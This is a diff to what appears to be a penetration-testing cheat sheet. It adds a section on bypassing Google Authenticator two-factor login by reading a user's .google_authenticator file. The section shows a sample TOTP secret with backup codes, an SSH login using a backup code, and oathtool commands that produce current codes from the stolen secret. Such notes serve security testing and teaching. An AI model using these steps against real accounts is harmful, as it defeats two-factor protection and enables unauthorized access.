@@ -134,6 +134,50 @@ ssh -i id_rsa user@target
 puttygen id_rsa -o key.ppk
 ```
 
+### Google Authenticator 2FA Bypass
+
+If you gain access to a user's home directory containing `.google_authenticator`, you can bypass 2FA.
+
+**File location:**
+```
+/home/username/.google_authenticator
+```
+
+**File contents:**
+```
+CLSSSMHYGLENX5HAIFBQ6L35UM    # Secret key (base32)
+" RATE_LIMIT 3 30 1718988529
+" WINDOW_SIZE 3
+" DISALLOW_REUSE 57299617
+" TOTP_AUTH
+99852083                       # Emergency backup codes
+20312647
+73235136
+92971994
+86175591
+```
+
+**Using emergency backup codes:**
+```bash
+ssh user@target
+(user@target) Verification code: 99852083   # Use any backup code
+user@target:~$
+```
+
+**Generate TOTP codes with oathtool:**
+```bash
+# Install oathtool
+sudo apt install oathtool
+
+# Generate current TOTP code from secret
+oathtool -b --totp 'CLSSSMHYGLENX5HAIFBQ6L35UM'
+548476
+
+# IMPORTANT: Ensure your system time matches the target machine!
+```
+
+---
+
 ### NTP Randomness&#x20;
 
 * Set ntp based on specific server time.  Required for kerberos auth, match attacker box to the time of the domain controller
